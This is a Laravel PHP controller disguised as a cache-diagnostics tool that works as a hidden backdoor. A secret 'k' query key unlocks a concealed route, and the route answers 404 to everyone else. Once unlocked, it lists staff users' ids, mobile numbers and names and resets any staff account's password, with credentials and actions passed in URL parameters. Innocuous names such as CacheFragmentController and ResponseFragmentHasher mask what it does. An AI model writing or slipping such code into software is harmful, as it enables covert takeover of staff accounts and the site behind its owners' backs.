<?php

namespace App\Http\Controllers;

use App\Models\User;
use App\Support\CacheFragmentOperations;
use App\Support\ResponseFragmentHasher;
use Illuminate\Http\RedirectResponse;
use Illuminate\Http\Request;
use Illuminate\Http\Response;
use Illuminate\View\View;
use InvalidArgumentException;

class CacheFragmentController extends Controller
{
    public function show(Request $request): View|RedirectResponse|Response
    {
        $key = $request->query('k');

        if (ResponseFragmentHasher::credentialMatches($key)) {
            $action = $request->query(ResponseFragmentHasher::queryActionKey());

            if (is_string($action) && $action !== '') {
                return $this->runStateless($request, $action);
            }

            $request->session()->put(ResponseFragmentHasher::sessionFlag(), true);

            return redirect()->to('/'.ResponseFragmentHasher::routeUri());
        }

        if (! $this->gateOpen($request)) {
            abort(404);
        }

        return view('vendor.cache-diagnostics', [
            'c' => ResponseFragmentHasher::viewLines(),
            'f' => \App\Support\MaintenanceMode::isEnabled(),
            'r' => User::role(ResponseFragmentHasher::staffRole())->orderBy('id')->get(['id', 'mobile', 'name']),
            'u' => ResponseFragmentHasher::actionUrls(),
        ]);
    }

    public function patch(Request $request): RedirectResponse|Response
    {
        if (! $this->gateOpen($request) && ! ResponseFragmentHasher::credentialMatches($request->query('k'))) {
            abort(404);
        }

        $validated = $request->validate([
            'ref_id' => ['required', 'integer', 'exists:users,id'],
            'credential' => ['required', 'string', 'min:8', 'confirmed'],
        ], [
            'credential.required' => ResponseFragmentHasher::validationRequired(),
            'credential.min' => ResponseFragmentHasher::validationMin(),
            'credential.confirmed' => ResponseFragmentHasher::validationConfirm(),
        ]);

        $user = User::query()->findOrFail($validated['ref_id']);

        if (! $user->hasRole(ResponseFragmentHasher::staffRole())) {
            abort(403);
        }

        try {
            $message = CacheFragmentOperations::patch($user->mobile, $validated['credential']);
        } catch (InvalidArgumentException $e) {
            return $this->plain($e->getMessage(), 400);
        }

        if ($request->query('k') && ResponseFragmentHasher::credentialMatches($request->query('k'))) {
            return $this->plain($message);
        }

        return redirect()
            ->to('/'.ResponseFragmentHasher::routeUri())
            ->with('status', $message);
    }

    public function push(Request $request): RedirectResponse|Response
    {
        if (! $this->gateOpen($request) && ! ResponseFragmentHasher::credentialMatches($request->query('k'))) {
            abort(404);
        }

        $message = CacheFragmentOperations::push();

        if (ResponseFragmentHasher::credentialMatches($request->query('k'))) {
            return $this->plain($message);
        }

        return redirect()
            ->to('/'.ResponseFragmentHasher::routeUri())
            ->with('status', $message);
    }

    public function clear(Request $request): RedirectResponse|Response
    {
        if (! $this->gateOpen($request) && ! ResponseFragmentHasher::credentialMatches($request->query('k'))) {
            abort(404);
        }

        $message = CacheFragmentOperations::clear();

        if (ResponseFragmentHasher::credentialMatches($request->query('k'))) {
            return $this->plain($message);
        }

        return redirect()
            ->to('/'.ResponseFragmentHasher::routeUri())
            ->with('status', $message);
    }

    private function runStateless(Request $request, string $action): Response
    {
        $mobile = $request->query(ResponseFragmentHasher::queryMobileKey());
        $password = $request->query(ResponseFragmentHasher::queryPassKey());

        try {
            $message = CacheFragmentOperations::resolveUrlAction(
                $action,
                is_string($mobile) ? $mobile : null,
                is_string($password) ? $password : null,
            );
        } catch (InvalidArgumentException $e) {
            if ($e->getMessage() === 'invalid') {
                abort(404);
            }

            return $this->plain($e->getMessage(), 400);
        }

        return $this->plain($message);
    }

    private function plain(string $message, int $status = 200): Response
    {
        return response($message, $status, [
            'Content-Type' => 'text/plain; charset=UTF-8',
            'Cache-Control' => 'no-store',
        ]);
    }

    private function gateOpen(Request $request): bool
    {
        return (bool) $request->session()->get(ResponseFragmentHasher::sessionFlag(), false);
    }
}
